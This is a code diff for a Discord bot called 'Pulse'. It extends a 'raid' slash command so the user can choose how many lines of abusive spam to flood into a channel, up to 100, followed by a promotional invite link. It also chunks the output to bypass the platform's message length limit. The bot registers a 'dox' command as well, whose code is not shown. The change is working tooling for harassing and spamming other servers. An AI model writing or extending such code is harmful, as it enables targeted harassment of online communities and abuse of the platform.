@@ -51,9 +51,26 @@ client.once('ready', async () => {
         console.log('✅ Cleared old commands');
         
         await client.application.commands.set([
-            { name: 'dox', description: 'Generate a fresh link' },
-            { name: 'raid', description: 'Flood the channel with a raid message' },
-            { name: 'invite', description: 'Get an invite link for Pulse' }
+            { 
+                name: 'dox', 
+                description: 'Generate a fresh link' 
+            },
+            { 
+                name: 'raid', 
+                description: 'Flood the channel with a raid message',
+                options: [
+                    {
+                        name: 'count',
+                        description: 'Number of spam lines (1-100)',
+                        type: 4,
+                        required: false
+                    }
+                ]
+            },
+            { 
+                name: 'invite', 
+                description: 'Get an invite link for Pulse' 
+            }
         ]);
         console.log('✅ Commands registered');
     } catch (error) {
@@ -88,7 +105,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.editReply({ embeds: [embed] });
     }
 
-    // ---- RAID (20 heading messages) ----
+    // ---- RAID ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
 
@@ -97,13 +114,30 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ This command can only be used in a server channel.');
         }
 
+        const count = interaction.options.getInteger('count') || 20;
+        if (count < 1 || count > 100) {
+            return interaction.editReply('❌ Count must be between 1 and 100.');
+        }
+
         try {
-            for (let i = 0; i < 20; i++) {
-                await channel.send('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
+            const lines = [];
+            for (let i = 0; i < count; i++) {
+                lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
             }
-            await channel.send(`join pulse to get raids like this: ${INVITE_LINK}`);
+            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
             
-            await interaction.editReply('✅ Raid sent successfully (20 heading messages).');
+            const bigMessage = lines.join('\n');
+
+            if (bigMessage.length > 2000) {
+                const chunks = bigMessage.match(/[\s\S]{1,1990}/g) || [];
+                for (const chunk of chunks) {
+                    await channel.send(chunk);
+                }
+            } else {
+                await channel.send(bigMessage);
+            }
+            
+            await interaction.editReply(`✅ Raid sent (${count} lines).`);
         } catch (error) {
             console.error('Raid failed:', error);
             await interaction.editReply('❌ Failed to send raid. Check bot permissions.');
